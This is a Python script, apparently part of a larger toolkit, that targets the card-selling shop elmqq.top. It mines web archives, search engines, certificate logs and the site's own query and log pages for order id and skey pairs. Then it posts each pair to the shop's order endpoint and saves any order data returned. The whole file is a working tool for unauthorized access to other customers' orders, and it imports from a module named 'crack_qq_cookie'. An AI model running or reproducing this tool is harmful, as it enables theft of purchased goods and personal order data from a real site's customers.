#!/usr/bin/env python3
"""多源搜索 elmqq.top 历史 showOrder(id,skey) 链。

来源: Wayback CDX、urlscan、crt 子域、站内分页、DuckDuckGo HTML、已知 body 扫描。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import quote, urljoin, urlparse

import requests
import urllib3

urllib3.disable_warnings()

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "cookie"))

from cookie.crack_qq_cookie import SHOWORDER  # noqa: E402
from faka_common import DEFAULT_UA, resolve_proxy  # noqa: E402

SHOWORDER_RE = SHOWORDER
SKEY_IN_URL = re.compile(r"[?&]skey=([a-f0-9]{16,64})", re.I)
ORDER_IN_URL = re.compile(r"[?&](?:id|order_id|trade_no)=(\d+)", re.I)

OUT_DIR = Path("/data/tools/faka/out/elmqq")
if not OUT_DIR.parent.exists():
    OUT_DIR = ROOT / "out" / "elmqq"
OUT_DIR.mkdir(parents=True, exist_ok=True)


def ts() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def log(msg: str, logf: Path) -> None:
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    with logf.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def extract_pairs(text: str, source: str) -> list[dict]:
    pairs: list[dict] = []
    seen: set[tuple[str, str]] = set()
    for oid, sk in SHOWORDER_RE.findall(text):
        key = (str(oid), str(sk))
        if key not in seen:
            seen.add(key)
            pairs.append({"id": oid, "skey": sk, "source": source})
    for m in SKEY_IN_URL.finditer(text):
        sk = m.group(1)
        oid_m = ORDER_IN_URL.search(text[max(0, m.start() - 80) : m.end() + 80])
        oid = oid_m.group(1) if oid_m else ""
        if sk:
            key = (oid or "?", sk)
            if key not in seen:
                seen.add(key)
                pairs.append({"id": oid or "?", "skey": sk, "source": source + ":url_skey"})
    return pairs


def commoncrawl_urls(domain: str, limit: int = 50) -> list[str]:
    urls: list[str] = []
    indexes = ["CC-MAIN-2025-08", "CC-MAIN-2024-51", "CC-MAIN-2024-33"]
    for idx in indexes:
        try:
            api = f"https://index.commoncrawl.org/{idx}-index?url={domain}/*&output=json&limit={limit}"
            r = requests.get(api, timeout=25)
            for line in r.text.splitlines():
                if not line.strip():
                    continue
                row = json.loads(line)
                u = row.get("url", "")
                if u:
                    urls.append(u)
        except Exception:
            continue
    return list(dict.fromkeys(urls))


def wayback_urls(domain: str, limit: int = 200) -> list[str]:
    urls: list[str] = []
    patterns = [
        f"https://web.archive.org/cdx/search/cdx?url={domain}/shop/*&output=json&fl=original&collapse=urlkey&limit={limit}",
        f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey&limit={limit}",
        f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&matchType=domain&output=json&fl=original&collapse=urlkey&limit={limit}",
    ]
    for api in patterns:
        try:
            r = requests.get(api, timeout=30)
            rows = r.json()
            if not rows or len(rows) < 2:
                continue
            for row in rows[1:]:
                if row and row[0]:
                    urls.append(row[0])
        except Exception:
            continue
    return list(dict.fromkeys(urls))


def urlscan_urls(domain: str) -> list[str]:
    urls: list[str] = []
    try:
        r = requests.get(
            f"https://urlscan.io/api/v1/search/?q=domain:{domain}",
            timeout=25,
            headers={"User-Agent": DEFAULT_UA},
        )
        for item in r.json().get("results", []):
            u = item.get("page", {}).get("url", "")
            if u:
                urls.append(u)
    except Exception:
        pass
    return urls


def crt_subdomains(domain: str) -> list[str]:
    hosts: list[str] = []
    try:
        r = requests.get(
            f"https://crt.sh/?q=%25.{domain}&output=json",
            timeout=40,
            headers={"User-Agent": DEFAULT_UA},
        )
        for row in r.json():
            for name in str(row.get("name_value", "")).split("\n"):
                name = name.strip().lstrip("*.")
                if name and domain in name:
                    hosts.append(name)
    except Exception:
        pass
    return sorted(set(hosts))


def ddg_search(query: str, max_results: int = 20) -> list[str]:
    urls: list[str] = []
    try:
        r = requests.get(
            "https://html.duckduckgo.com/html/",
            params={"q": query},
            timeout=20,
            headers={"User-Agent": DEFAULT_UA},
        )
        for m in re.finditer(r'uddg=([^&"]+)', r.text):
            from urllib.parse import unquote

            u = unquote(m.group(1))
            if u.startswith("http"):
                urls.append(u)
            if len(urls) >= max_results:
                break
    except Exception:
        pass
    return urls


def fetch_url(url: str, proxy: str, timeout: int = 20) -> tuple[str, str]:
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": DEFAULT_UA})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.get(url, timeout=timeout, allow_redirects=True)
        return url, r.text
    except Exception as e:
        return url, f"__ERROR__:{e}"


def crawl_site(host: str, path: str, proxy: str) -> list[dict]:
    pairs: list[dict] = []
    base = f"https://{host}{path}"
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": DEFAULT_UA, "Referer": base})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    targets = [
        base,
        base + "?mod=query",
        base + "toollogs.php",
    ]
    for page in range(1, 21):
        targets.append(base + f"?mod=query&page={page}")
        targets.append(base + f"toollogs.php?page={page}")

    for url in targets:
        try:
            r = s.get(url, timeout=20)
            found = extract_pairs(r.text, f"site:{url}")
            pairs.extend(found)
            time.sleep(0.3)
        except Exception:
            continue
    return pairs


def verify_order(host: str, path: str, oid: str, skey: str, proxy: str) -> dict[str, Any]:
    base = f"https://{host}{path}"
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": DEFAULT_UA, "Referer": base + "?mod=query"})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    try:
        s.get(base, timeout=15)
        r = s.post(
            base + "ajax.php?act=order",
            data={"id": str(oid), "skey": str(skey)},
            timeout=20,
        )
        return r.json() if r.text.strip().startswith("{") else {"raw": r.text[:200]}
    except Exception as e:
        return {"error": str(e)}


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="showOrder 历史链狩猎")
    ap.add_argument("--host", default="elmqq.top")
    ap.add_argument("--path", default="/shop/")
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--no-verify", action="store_true", help="找到对后不验证 order")
    return ap.parse_args()


def main() -> int:
    args = parse_args()
    proxy = resolve_proxy(args.proxy)
    run_dir = OUT_DIR / f"showorder_hunt_{ts()}"
    run_dir.mkdir(parents=True, exist_ok=True)
    logf = OUT_DIR / "showorder_hunt.log"
    all_pairs: list[dict] = []
    seen: set[tuple[str, str]] = set()
    fetch_urls: list[str] = []

    queries = [
        f"site:{args.host} showOrder",
        f"site:{args.host} skey",
        f'"{args.host}" showOrder',
        f'"{args.host}/shop" kminfo',
        f"elmqq showOrder skey",
    ]
    for q in queries:
        fetch_urls.extend(ddg_search(q))

    fetch_urls.extend(wayback_urls(args.host))
    fetch_urls.extend(commoncrawl_urls(args.host))
    fetch_urls.extend(urlscan_urls(args.host))

    subs = crt_subdomains(args.host)
    (run_dir / "subdomains.txt").write_text("\n".join(subs), encoding="utf-8")
    for sub in subs:
        fetch_urls.append(f"https://{sub}/shop/")
        fetch_urls.append(f"https://{sub}/shop/?mod=query")
        fetch_urls.append(f"https://{sub}/shop/toollogs.php")

    fetch_urls = [u for u in dict.fromkeys(fetch_urls) if u.startswith("http")]
    (run_dir / "urls_to_fetch.txt").write_text("\n".join(fetch_urls), encoding="utf-8")
    log(f"URLs queued: {len(fetch_urls)}", logf)

    site_pairs = crawl_site(args.host, args.path, proxy)
    for p in site_pairs:
        key = (str(p["id"]), str(p["skey"]))
        if key not in seen:
            seen.add(key)
            all_pairs.append(p)
    log(f"Site crawl pairs: {len(site_pairs)}", logf)

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(fetch_url, u, proxy): u for u in fetch_urls}
        for fut in as_completed(futs):
            url, body = fut.result()
            if body.startswith("__ERROR__"):
                continue
            (run_dir / "bodies").mkdir(exist_ok=True)
            safe = re.sub(r"[^a-zA-Z0-9._-]", "_", urlparse(url).netloc + urlparse(url).path)[:120]
            (run_dir / "bodies" / f"{safe}.body").write_text(body[:500000], encoding="utf-8", errors="replace")
            for p in extract_pairs(body, url):
                key = (str(p["id"]), str(p["skey"]))
                if key not in seen:
                    seen.add(key)
                    all_pairs.append(p)
                    log(f"HIT pair id={p['id']} skey={p['skey'][:12]}... from {url[:80]}", logf)

    verified: list[dict] = []
    if not args.no_verify:
        for p in all_pairs:
            if p["id"] in ("?", ""):
                continue
            od = verify_order(args.host, args.path, str(p["id"]), str(p["skey"]), proxy)
            rec = {**p, "order_resp": od}
            verified.append(rec)
            if isinstance(od, dict) and od.get("code") == 0:
                log(f"[+] ORDER OK id={p['id']}", logf)
                dump = run_dir / f"order_{p['id']}.json"
                dump.write_text(json.dumps(od, ensure_ascii=False, indent=2), encoding="utf-8")

    report = {
        "host": args.host,
        "path": args.path,
        "pairs": all_pairs,
        "verified": verified,
        "urls_fetched": len(fetch_urls),
        "subdomains": subs,
    }
    (run_dir / "hunt_report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    (OUT_DIR / "skey_pairs.json").write_text(json.dumps(all_pairs, ensure_ascii=False, indent=2), encoding="utf-8")
    log(f"DONE pairs={len(all_pairs)} verified={len(verified)} out={run_dir}", logf)
    return 0 if all_pairs else 1


if __name__ == "__main__":
    raise SystemExit(main())
